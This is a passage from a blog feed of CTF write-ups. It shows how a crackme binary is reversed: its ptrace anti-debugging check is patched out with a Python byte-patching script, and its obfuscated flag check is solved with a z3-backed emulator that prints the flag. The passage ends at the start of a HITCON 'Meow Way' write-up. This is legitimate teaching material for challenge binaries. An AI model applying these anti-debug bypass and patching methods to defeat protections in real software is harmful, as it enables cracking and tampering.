</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x49:</span>   <span class="nf">xor</span> <span class="no">r10</span><span class="p">,</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x4c:</span>   <span class="nf">mov</span> <span class="no">r8</span><span class="p">,</span> <span class="mi">0x2a3bfde6</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x53:</span>   <span class="nf">add</span> <span class="no">r8</span><span class="p">,</span> <span class="no">r10</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x56:</span>   <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x32b2ae6b</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5d:</span>   <span class="nf">sub</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">r8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x60:</span>   <span class="nf">movabs</span>  <span class="no">rax</span><span class="p">,</span> <span class="mi">0x19097a1e9</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6a:</span>   <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6d:</span>   <span class="nf">movabs</span>  <span class="no">rdx</span><span class="p">,</span> <span class="mi">0xdd66c684</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x77:</span>   <span class="nf">movabs</span>  <span class="no">rsi</span><span class="p">,</span> <span class="mi">0xe89e6c60</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x81:</span>   <span class="nf">add</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rdx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x84:</span>   <span class="nf">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x147e8930</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x8b:</span>   <span class="nf">xor</span> <span class="no">rbx</span><span class="p">,</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x8e:</span>   <span class="nf">movabs</span>  <span class="no">rsi</span><span class="p">,</span> <span class="mi">0xfbd886c4</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x98:</span>   <span class="nf">xor</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x9b:</span>   <span class="nf">movabs</span>  <span class="no">r9</span><span class="p">,</span> <span class="mi">0xcb56fcb7</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xa5:</span>   <span class="nf">xor</span> <span class="no">r9</span><span class="p">,</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xa8:</span>   <span class="nf">mov</span> <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x3e2bc149</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xaf:</span>   <span class="nf">xor</span> <span class="no">rbx</span><span class="p">,</span> <span class="no">r9</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xb2:</span>   <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x3231b3f7</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xb9:</span>   <span class="nf">add</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xbc:</span>   <span class="nf">movabs</span>  <span class="no">r11</span><span class="p">,</span> <span class="mi">0xad2afb66</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xc6:</span>   <span class="nf">sub</span> <span class="no">r11</span><span class="p">,</span> <span class="no">rdx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xc9:</span>   <span class="nf">movabs</span>  <span class="no">rcx</span><span class="p">,</span> <span class="mi">0x1f4b71da6</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xd3:</span>   <span class="nf">add</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">r11</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xd6:</span>   <span class="nf">ret</span>
</span></span></code></pre></div><p>and we can find the <code>ptrace</code> call in there:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">bloc:</span> <span class="err">0</span><span class="nf">x6d9</span>   <span class="mi">0xd48c0a3a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0:</span>    <span class="nf">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x2:</span>    <span class="nf">push</span>    <span class="mi">0x65</span>        <span class="c1">; ptrace syscall number
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x4:</span>    <span class="nf">pop</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5:</span>    <span class="nf">syscall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7:</span>    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xa:</span>    <span class="nf">movabs</span>  <span class="no">r10</span><span class="p">,</span> <span class="mi">0xc9d392ed</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x14:</span>   <span class="nf">movabs</span>  <span class="no">rbx</span><span class="p">,</span> <span class="mi">0xf21ee895</span>
</span></span></code></pre></div><p><code>ptrace</code> will return 0 upon success, so one way to circumvent it is to change <code>syscall</code> to <code>xor eax, eax</code>.</p>
<p>Both instructions are the same size:</p>
<pre tabindex="0"><code>% rasm2 -b64 &#39;syscall&#39;
0f05
% rasm2 -b64 &#34;xor eax, eax&#34;
31c0
</code></pre><p>we can use the following script to patch a new binary (not forgetting the XOR):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">idx</span> <span class="o">=</span> <span class="mh">0x6d9</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">xor_key</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xd48c0a3a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">file_offset</span> <span class="o">=</span> <span class="mh">0xc0a0</span> <span class="o">+</span> <span class="n">idx</span><span class="o">*</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;crackme2&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># syscall -&gt; xor eax,eax</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="p">[</span><span class="n">file_offset</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="p">[</span><span class="n">file_offset</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc0</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;crackme2.patch&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span></code></pre></div><p>if we dump the encrypted code blocs from the patched binary we can validate the change:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">bloc:</span> <span class="err">0</span><span class="nf">x6d9</span>   <span class="mi">0xd48c0a3a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0:</span>    <span class="nf">xor</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x2:</span>    <span class="nf">push</span>    <span class="mi">0x65</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x4:</span>    <span class="nf">pop</span>    <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x5:</span>    <span class="nf">xor</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>     <span class="c1">; here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x7:</span>    <span class="nf">mov</span>    <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xa:</span>    <span class="nf">movabs</span>    <span class="no">r10</span><span class="p">,</span> <span class="mi">0xc9d392ed</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x14:</span>    <span class="nf">movabs</span>    <span class="no">rbx</span><span class="p">,</span> <span class="mi">0xf21ee895</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x1e:</span>    <span class="nf">sub</span>    <span class="no">rbx</span><span class="p">,</span> <span class="no">r10</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x21:</span>    <span class="nf">movabs</span>    <span class="no">r8</span><span class="p">,</span> <span class="mi">0xa019c58c</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x2b:</span>    <span class="nf">xor</span>    <span class="no">r8</span><span class="p">,</span> <span class="no">rbx</span>
</span></span></code></pre></div><p>if we re-run the GDB trace script on the patched binary, the generated trace is much longer and that&rsquo;s now something we can work on</p>
<h1 id="3-flag-in-the-haystack">3. Flag in the haystack</h1>
<p>The initial trace was executing 17 encrypted blocs, the new one goes over 125</p>
<pre tabindex="0"><code>% wc -l trace_crack2.txt.*
  17 trace_crack2.txt.1
 125 trace_crack2.txt.2
 142 total
</code></pre><p>that&rsquo;s both a good and bad news because the assembly is obfuscated by a lot of arithmetic constants unfolding and we need to find how the flag is checked.</p>
<p>We can also generate a new disassembly out of this trace using the same script as before:</p>
<pre tabindex="0"><code>% ./dump.py crackme2.patch &gt; trace2.txt
</code></pre><p>At some point the code needs to load the input flag if it wants to check.
When the decrypted code is called, debugging shows no obvious reference to the input string in any register, however we know from the <code>main</code> function that it&rsquo;s been copied to the
stack.</p>
<p>We can see some blocks are loading an address relative to the stack, which is already a good lead:</p>
<pre tabindex="0"><code>% egrep &#34;bloc|rbp&#34; trace2.txt
[...]
bloc: 0x8d3   0xe2b797ea
0x42:	lea	rdx, [rbp + rdx]
bloc: 0x97b   0xfe5ddd5e
0x42:	lea	rbx, [rbp + rbx]
bloc: 0xa14   0x5eb21c2c
0x4b:	lea	rdx, [rbp + rdx]
bloc: 0xab3   0x44c6f479
0x42:	lea	r10, [rbp + r10]
[...]
</code></pre><p>also there must be some kind of conditionnal instruction somewhere to trigger the good or bad message.</p>
<p>Some block contain a <code>cmp</code> instruction, but they are just decoys and here for more confusion.
The before last block of the new trace is interesting as it ends with:</p>
<pre tabindex="0"><code>0x1e1:  test    r12, r12
0x1e4:  cmove   rdx, rbx
0x1e8:  mov rcx, rdx
0x1eb:  ret
</code></pre><p>The <code>CMOVE</code> instruction will move rbx to rdx if r12 == 0. RDX then ends up in ECX which holds the index of the next bloc to run.</p>
<p>If we debug the binary and force r12 to be 0 at this stage, we end up with the winning message, so in order to get the correct flag, we need to end up with r12 == 0.</p>
<pre tabindex="0"><code>% grep r12 trace2.txt
0x91:	xor	r12, r12
0xfb:	or	r12, rdx
0x12c:	or	r12, rdx
0xf5:	or	r12, r11
0x109:	or	r12, rdx
0x115:	or	r12, r8
0x106:	or	r12, rax
0xfa:	or	r12, r10
0x126:	or	r12, rdx
0x10b:	or	r12, rcx
0x108:	or	r12, r9
0x10b:	or	r12, rdx
0x104:	or	r12, r8
0x119:	or	r12, rdi
0x126:	or	r12, r10
0x11c:	or	r12, r9
0x118:	or	r12, rsi
0x10c:	or	r12, rdx
0x10e:	or	r12, rbx
0x119:	or	r12, r10
0x10e:	or	r12, r10
0x118:	or	r12, rdx
0xf1:	or	r12, rdi
0x10f:	or	r12, rax
0x109:	or	r12, rbx
0x128:	or	r12, rax
0x119:	or	r12, r10
0xfb:	or	r12, rbx
0x129:	or	r12, rcx
0xfa:	or	r12, r11
0x119:	or	r12, r11
0x119:	or	r12, rdi
0x108:	or	r12, rcx
0x124:	or	r12, rbx
0x11e:	or	r12, rbx
0x118:	or	r12, rsi
0x12c:	or	r12, r10
0x13c:	or	r12, rbx
0xfe:	or	r12, r8
0x119:	or	r12, r10
0x122:	or	r12, r10
0xfb:	test	r12, r12
0x1e1:	test	r12, r12
</code></pre><p>it&rsquo;s first initialized to 0 and sometimes <code>or</code>&rsquo;d with another register (which must zero as well if we want it to remain zero).</p>
<p>starring at the screen, we can notice a recurring pattern in some blocks, like this one:</p>
<pre tabindex="0"><code>bloc: 0x165c   0x803ed377
;
;  /// skipped some instructions
;
; load input flag string 
0x45:   lea r9, [rbp + r9]
;
; /// skipped more instructions
;
; load char &#39;r9&#39; from the input flag string
0xbb:   movzx   rax, byte ptr [r9 + rbx]
;
; /// skipped even more instructions
;
; do a or with r12
0xfb:   or  r12, rdx
</code></pre><p>so if can we find these blocks, get the character index that being checked (from the movzx instruction) and then manage to get 0 in the or&rsquo;d register with r12, we should be good to go.</p>
<h1 id="4-poor-mans-ugly-emulation">4. Poor man&rsquo;s ugly emulation</h1>
<p>As i&rsquo;m not familiar enough with <a href="https://miasm.re/">miasm</a> or <a href="https://triton-library.github.io/">Triton</a> to quickly do what i wanted in my limited available i went down the quick
and dirty road:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">emu</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;######################&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">st</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;r12&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span><span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">op</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">mnemonic</span>
</span></span><span class="line"><span class="cl">            <span class="n">dat</span> <span class="o">=</span>  <span class="n">i</span><span class="o">.</span><span class="n">op_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#print(op, dat)</span>
</span></span><span class="line"><span class="cl">            <span class="n">match</span> <span class="n">i</span><span class="o">.</span><span class="n">mnemonic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;mov&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;movabs&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;sub&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">-=</span> <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;add&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">+=</span> <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;xor&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">^=</span> <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;or&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">|=</span> <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;r12&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="c1"># r12 persist and must be 0 for last check to pass</span>
</span></span><span class="line"><span class="cl">                        <span class="c1">#print(&#34; ---------- R12&#34;)</span>
</span></span><span class="line"><span class="cl">                        <span class="c1">#print(st[dat[1]])</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">st</span><span class="p">[</span><span class="s1">&#39;r12&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                        <span class="c1"># solve dat[1] == 0</span>
</span></span><span class="line"><span class="cl">                        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">slv</span><span class="p">(</span><span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">1</span><span class="p">]],</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="bp">self</span><span class="o">.</span><span class="n">out</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;lea&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># load flag</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">==</span> <span class="mi">16488</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;load flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">flag</span>
</span></span><span class="line"><span class="cl">                <span class="n">case</span> <span class="s1">&#39;movzx&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># load flag chr index</span>
</span></span><span class="line"><span class="cl">                    <span class="n">o1</span> <span class="o">=</span> <span class="n">dat</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="n">o2</span> <span class="o">=</span> <span class="n">dat</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">][</span><span class="mi">1</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">st</span><span class="p">[</span><span class="n">o1</span><span class="p">])</span> <span class="ow">is</span> <span class="nb">list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">pos</span> <span class="o">=</span> <span class="n">st</span><span class="p">[</span><span class="n">o2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                        <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">st</span><span class="p">[</span><span class="n">o1</span><span class="p">][</span><span class="n">pos</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">st</span><span class="p">[</span><span class="n">o2</span><span class="p">])</span> <span class="ow">is</span> <span class="nb">list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">pos</span> <span class="o">=</span> <span class="n">st</span><span class="p">[</span><span class="n">o1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                        <span class="n">st</span><span class="p">[</span><span class="n">dat</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">st</span><span class="p">[</span><span class="n">o2</span><span class="p">][</span><span class="n">pos</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">op</span><span class="p">,</span> <span class="n">dat</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">st</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="k">raise</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;checking flag pos </span><span class="si">%d</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">pos</span><span class="p">)</span>
</span></span></code></pre></div><p>I used z3 to symbolize the input flag and then solve the contrains to keep r12 == 0 (which turned out to be quite simple&hellip;)</p>
<p>Full script <a href="https://gist.github.com/matthw/0a02e8324bf90b1a90ae38bdd1229adb">here</a>.</p>
<p>Running the script yields the following output:</p>
<pre tabindex="0"><code>% python emu.py
bloc: 0x801   0x3c23c429
######################
bloc: 0x839   0x47569508
######################
[...]
######################
load flag
checking flag pos 5
0 | 100 - f5 &amp; 255
bytearray(b&#39;\x00\x00\x00\x00{d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)
bloc: 0x18d3   0x22b364d3
######################
load flag
checking flag pos 39
0 | 125 - f39 &amp; 255
bytearray(b&#39;\x00\x00\x00\x00{d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00&#39;)
bloc: 0x195d   0xc295cc42
######################
bloc: 0x19b5   0xd7f207a3
######################
load flag
checking flag pos 18
0 | 95 - f18 &amp; 255
bytearray(b&#39;\x00\x00\x00\x00{d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00_\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00&#39;)
bloc: 0x1a46   0x545b9046
######################
load flag
checking flag pos 9
0 | 121 - f9 &amp; 255
bytearray(b&#39;\x00\x00\x00\x00{d\x00\x00\x00y\x00\x00\x00\x00\x00\x00\x00\x00_\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00&#39;)

[....]

######################
load flag
checking flag pos 17
0 | 51 - f17 &amp; 255
bytearray(b&#39;grey{d1d_y0u_s0lv3_b\x00_emul4t1ng?_1e4b8a}\x00&#39;)
bloc: 0x3e51   0x193272c7
######################
load flag
checking flag pos 7
bloc: 0x3ee7   0xd6d30c89
######################
load flag
checking flag pos 20
0 | 121 - f20 &amp; 255
bytearray(b&#39;grey{d1d_y0u_s0lv3_by_emul4t1ng?_1e4b8a}\x00&#39;)
bloc: 0x3f84   0xd25edc37
######################
</code></pre><h1 id="5-files">5. Files</h1>
<ul>
<li>binary: <a href="crackme2">crackme2</a></li>
<li>gdb trace script: <a href="trace.py">trace.py</a></li>
<li>disassembler: <a href="dump.py">dump.py</a></li>
<li>ptrace patcher: <a href="patch.py">patch.py</a></li>
<li>emulator: <a href="emu.py">emu.py</a></li>
<li>execution trace before ptrace patch: <a href="trace_crack2_1.txt">trace_crack2_1.txt</a> + disassembly <a href="trace1.txt">trace1.txt</a></li>
<li>execution trace after ptrace patch: <a href="trace_crack2_2.txt">trace_crack2_2.txt</a> + disassembly <a href="trace2.txt">trace2.txt</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>HITCON CTF 2022: Meow Way</title>
			<link>https://matth.dmz42.org/posts/2022/hitcon-ctf-2022-meow-way/</link>
			<pubDate>Fri, 09 Dec 2022 08:00:00 +0100</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/hitcon-ctf-2022-meow-way/</guid>
			<description>This is a 32 bit PE file using an interesting trick.
You can grab the file here.
1. Quick Recon Opening the file in ghidra and navigating from the entry point to the main function we find something like:
if (argc &amp;lt; 2) { printf(&amp;#34;Usage: %s &amp;lt;flag&amp;gt;\n&amp;#34;,(char)*argv); /* WARNING: Subroutine does not return */ exit(1); } f = argv[1]; argv1 = f + 1; do { cVar1 = *f; f = f + 1; } while (cVar1 !</description>
			<content type="html"><![CDATA[<p>This is a 32 bit PE file using an interesting trick.</p>
<p>You can grab the file <a href="meow_way-d3c58f1d74aae3647cfb5c5bb2791da4d900dc16.zip">here</a>.</p>
<h1 id="1-quick-recon">1. Quick Recon</h1>
<p>Opening the file in ghidra and navigating from the entry point to the main function we find something like:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s &lt;flag&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">f</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
